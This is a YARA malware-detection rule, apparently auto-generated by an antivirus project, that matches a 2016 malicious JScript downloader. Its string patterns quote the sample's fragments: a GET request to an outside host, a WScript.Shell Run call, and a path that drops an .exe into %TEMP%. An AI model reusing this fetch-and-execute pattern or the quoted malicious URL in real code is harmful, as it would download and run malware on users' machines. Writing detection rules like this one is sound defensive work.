rule sig_20160328_c25de00d722c502d09b2d1ddee5f3a32 {
  meta:
    description = "datamaliciousorder - file 20160328_c25de00d722c502d09b2d1ddee5f3a32.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "25ee7c0fd6ee3b4792378d19fa82067983d6fe7ad04c32e6ff424d96e6c3acff"

  strings:
    $s1  = "function Xnvsm() {return Xwgrvsc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"P2cLqDDg.exe\";};" fullword ascii
    $s2  = "do {WScript[Fcjyxwyrc](Utzbqmsd() * 11)} while (Effphxvso[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Wvbcyetm(Rkxgo, Qcwisnoxf){return Rkxgo - Qcwisnoxf;};" fullword ascii
    $s4  = "Effphxvso[Yctsd](\"GET\", \"http://vasundhara.in/ok2lka\", false);" fullword ascii
    $s5  = "var Xwgrvsc = function Cevkeoqa() {return WScript[Fylpkdnfk](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Xklcfnafl(Behwlysmb){Xwgrvsc[\"Run\"](Behwlysmb, Rfvshzcy, Rfvshzcy);};" fullword ascii
    $s7  = "function Igjvj() {return ((Aadurhndey == true) && (Aadurhndey == Szajjtmf)) ? 1 : Rfvshzcy;};" fullword ascii
    $s8  = "function Utzbqmsd(){return 22;};" fullword ascii
    $s9  = " while (Veutrflgw){" fullword ascii
    $s10 = "function Aodbpb(){return Etuzpuw;};" fullword ascii
    $s11 = "var Aadurhndey = false;" fullword ascii
    $s12 = "function Ytcbwq(){return Fylpkdnfk;};" fullword ascii
    $s13 = "var Szajjtmf = false;" fullword ascii
    $s14 = "var Regywbdha = false;" fullword ascii
    $s15 = "function Jblaswo(Dtszmy) {var Tuojz = (1, 2, 3, 4, 5, Dtszmy); return Tuojz;};" fullword ascii
    $s16 = "Szajjtmf = true; " fullword ascii
    $s17 = "function Ndmgs()" fullword ascii
    $s18 = "return Wvbcyetm(Lqgyh, Elirw);" fullword ascii
    $s19 = "var Yxxen = new this[\"Date\"]();" fullword ascii
    $s20 = "Aadurhndey = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}